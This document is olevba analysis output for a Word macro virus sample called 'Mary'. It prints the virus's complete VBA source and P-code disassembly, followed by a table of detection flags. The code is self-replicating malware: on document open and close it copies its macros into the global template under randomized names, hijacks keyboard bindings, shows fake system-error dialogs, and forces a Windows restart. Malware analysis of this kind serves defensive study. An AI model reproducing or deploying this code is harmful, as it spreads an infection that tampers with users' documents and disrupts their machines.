olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Mary - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Polly()
On Error GoTo Gone
A$ = FileName$()
If A$ = "" Then GoTo Finish
If VInstalled = 0 Then
        Run1
        Run2
        FileSaveAll 1, 1
Else
        GoTo Done
End If
 
Gone:
A$ = FileName$()
If A$ = "" Then
        GoTo Finish
Else
        Insert " "
End If
 
Finish:
MsgBox "Mary wants a cracker", -8
End Sub
 
Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)
 
Z$ = X$ + Y$
 
R1$ = GetDocumentVar$("MaryVirDoc")
CO$ = FileName$() + ":" + R1$
MacroCopy CO$, "Global:" + Z$
SetProfileString "Intl", "Info2", Z$
ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub


Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)
 
Z$ = X$ + Y$
 
R2$ = GetDocumentVar$("VirName")
OC$ = FileName$() + ":" + R2$
MacroCopy OC$, "Global:" + Z$
SetProfileString "Intl", "Info1", Z$
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub
 
Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
        VInstalled = 0
        If CountMacros(0) > 0 Then
                For i = 1 To CountMacros(0)
                If MacroName$(i, 0) = CC$ Then
                        VInstalled = 1
                End If
        Next i
End If
End Function
 
Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
 
B$ = Mid$(A$, 1, 1)
C$ = Mid$(A$, 2, 1)
D$ = Mid$(A$, 3, 1)
E$ = Mid$(A$, 4, 1)
 
If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"
 
If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"
 
If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"
 
If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"
 
Fun$ = F$ + G$ + H$ + J$
End Function

Sub AutoOpen()
Infect
Polly
Payload
End Sub

Sub Payload()
ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0

If Month(Now()) = 1 Then
If Day(Now()) = 21 Then
MsgBox "Mary was proudly made by Lorz"
End If
End If
End Sub

Sub AutoClose()
On Error GoTo phil
Infect
Polly
ActiveDocument.Save
Payload
MsgBox "System Unstable, Please reboot you computer"
ExitWindowsEx 2, ffffffff
phil:
End Sub

Sub Infect()
MacroCopy Name$, "Global:AutoOpen"
MacroCopy Name$, "Global:Polly"
MacroCopy Name$, "Global:AutoClose"
MacroCopy Name$, "Global:Payload"
MacroCopy Name$, "Global:ToolsMacro"


Name$ = WindowName$() + ":AutoOpen"
Name$ = WindowName$() + ":AutoClose"
Name$ = WindowName$() + ":ToolsMacro"
ToolsMacro .Name = "Payload", .Run, .Show = 0, .Discription = "", .NewName = ""

End Sub

Sub ToolsMacro()
On Error GoTo phil
Payload
MsgBox "Memory, Stack Error at CS:1000", , _
"Memory Allocation Error"
Infect
phil:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mary
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Module1 - 8536 bytes
' Line #0:
' 	FuncDefn (Sub Polly())
' Line #1:
' 	OnError Gone 
' Line #2:
' 	ArgsLd FileName$ 0x0000 
' 	St A$ 
' Line #3:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #4:
' 	Ld VInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	ArgsCall Run1 0x0000 
' Line #6:
' 	ArgsCall Run2 0x0000 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsCall FileSaveAll 0x0002 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	GoTo Done 
' Line #10:
' 	EndIfBlock 
' Line #11:
' Line #12:
' 	Label Gone 
' Line #13:
' 	ArgsLd FileName$ 0x0000 
' 	St A$ 
' Line #14:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #15:
' 	GoTo Finish 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LitStr 0x0001 " "
' 	ArgsCall Insert 0x0001 
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	Label Finish 
' Line #21:
' 	LitStr 0x0014 "Mary wants a cracker"
' 	LitDI2 0x0008 
' 	UMi 
' 	ArgsCall MsgBox 0x0002 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Sub Run1())
' Line #25:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #26:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #27:
' Line #28:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #29:
' Line #30:
' 	LitStr 0x000A "MaryVirDoc"
' 	ArgsLd GetDocumentVar$ 0x0001 
' 	St R1$ 
' Line #31:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R1$ 
' 	Add 
' 	St CO$ 
' Line #32:
' 	Ld CO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #33:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #34:
' 	MemLdWith KeyCode 
' 	LitDI2 0x0041 
' 	Eq 
' 	MemLdWith Category 
' 	LitDI2 0x0002 
' 	Eq 
' 	MemLdWith New 
' 	Ld Z$ 
' 	Eq 
' 	MemLdWith Add 
' 	MemLdWith Context 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsCustomizeKeyboard 0x0005 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' Line #38:
' 	FuncDefn (Sub Run2())
' Line #39:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #40:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #41:
' Line #42:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #43:
' Line #44:
' 	LitStr 0x0007 "VirName"
' 	ArgsLd GetDocumentVar$ 0x0001 
' 	St R2$ 
' Line #45:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R2$ 
' 	Add 
' 	St OC$ 
' Line #46:
' 	Ld OC$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #47:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #48:
' 	MemLdWith KeyCode 
' 	LitDI2 0x0020 
' 	Eq 
' 	MemLdWith Category 
' 	LitDI2 0x0002 
' 	Eq 
' 	MemLdWith New 
' 	Ld Z$ 
' 	Eq 
' 	MemLdWith Add 
' 	MemLdWith Context 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsCustomizeKeyboard 0x0005 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' 	FuncDefn (Function VInstalled())
' Line #52:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St CC$ 
' Line #53:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #54:
' 	LitDI2 0x0000 
' 	ArgsLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd CountMacros 0x0001 
' 	For 
' Line #56:
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd MacroName$ 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndFunc 
' Line #62:
' Line #63:
' 	FuncDefn (Function Fun(False, G, H, J))
' Line #64:
' 	LitDI2 0x0491 
' 	St One 
' Line #65:
' 	LitDI2 0x244E 
' 	St Two 
' Line #66:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	FnInt 
' 	St Num 
' Line #67:
' 	Ld Num 
' 	ArgsLd Str$ 0x0001 
' 	St A$ 
' Line #68:
' 	Ld A$ 
' 	ArgsLd LTrim$ 0x0001 
' 	St A$ 
' Line #69:
' Line #70:
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B$ 
' Line #71:
' 	Ld A$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St C$ 
' Line #72:
' 	Ld A$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St D$ 
' Line #73:
' 	Ld A$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St E$ 
' Line #74:
' Line #75:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #76:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #77:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #78:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #79:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #80:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #81:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #82:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #83:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #84:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #85:
' Line #86:
' 	Ld C$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #87:
' 	Ld C$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #88:
' 	Ld C$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #89:
' 	Ld C$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #90:
' 	Ld C$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #91:
' 	Ld C$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #92:
' 	Ld C$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #93:
' 	Ld C$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #94:
' 	Ld C$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #95:
' 	Ld C$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #96:
' Line #97:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #98:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #99:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #100:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #101:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #102:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #103:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #104:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #105:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #106:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #107:
' Line #108:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #109:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #110:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #111:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #112:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #113:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #114:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #115:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #116:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #117:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #118:
' Line #119:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #120:
' 	EndFunc 
' Line #121:
' Line #122:
' 	FuncDefn (Sub AutoOpen())
' Line #123:
' 	ArgsCall Infect 0x0000 
' Line #124:
' 	ArgsCall Polly 0x0000 
' Line #125:
' 	ArgsCall Payload 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Sub Payload())
' Line #129:
' 	MemLdWith KeyCode 
' 	LitDI2 0x001B 
' 	Eq 
' 	MemLdWith Category 
' 	LitDI2 0x0001 
' 	Eq 
' 	MemLdWith New 
' 	LitStr 0x0006 "Cancel"
' 	Eq 
' 	MemLdWith Remove 
' 	MemLdWith Context 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsCustomizeKeyboard 0x0005 
' Line #130:
' Line #131:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	IfBlock 
' Line #133:
' 	LitStr 0x001D "Mary was proudly made by Lorz"
' 	ArgsCall MsgBox 0x0001 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndSub 
' Line #137:
' Line #138:
' 	FuncDefn (Sub AutoClose())
' Line #139:
' 	OnError phil 
' Line #140:
' 	ArgsCall Infect 0x0000 
' Line #141:
' 	ArgsCall Polly 0x0000 
' Line #142:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #143:
' 	ArgsCall Payload 0x0000 
' Line #144:
' 	LitStr 0x002B "System Unstable, Please reboot you computer"
' 	ArgsCall MsgBox 0x0001 
' Line #145:
' 	LitDI2 0x0002 
' 	Ld ffffffff 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #146:
' 	Label phil 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' 	FuncDefn (Sub Infect())
' Line #150:
' 	Ld New$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	ArgsCall MacroCopy 0x0002 
' Line #151:
' 	Ld New$ 
' 	LitStr 0x000C "Global:Polly"
' 	ArgsCall MacroCopy 0x0002 
' Line #152:
' 	Ld New$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	ArgsCall MacroCopy 0x0002 
' Line #153:
' 	Ld New$ 
' 	LitStr 0x000E "Global:Payload"
' 	ArgsCall MacroCopy 0x0002 
' Line #154:
' 	Ld New$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	ArgsCall MacroCopy 0x0002 
' Line #155:
' Line #156:
' Line #157:
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St New$ 
' Line #158:
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St New$ 
' Line #159:
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St New$ 
' Line #160:
' 	MemLdWith New 
' 	LitStr 0x0007 "Payload"
' 	Eq 
' 	MemLdWith Run 
' 	MemLdWith Show 
' 	LitDI2 0x0000 
' 	Eq 
' 	MemLdWith Discription 
' 	LitStr 0x0000 ""
' 	Eq 
' 	MemLdWith NewName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	ArgsCall ToolsMacro 0x0005 
' Line #161:
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub ToolsMacro())
' Line #165:
' 	OnError phil 
' Line #166:
' 	ArgsCall Payload 0x0000 
' Line #167:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x001E "Memory, Stack Error at CS:1000"
' 	ParamOmitted 
' 	LitStr 0x0017 "Memory Allocation Error"
' 	ArgsCall MsgBox 0x0003 
' Line #168:
' 	ArgsCall Infect 0x0000 
' Line #169:
' 	Label phil 
' Line #170:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

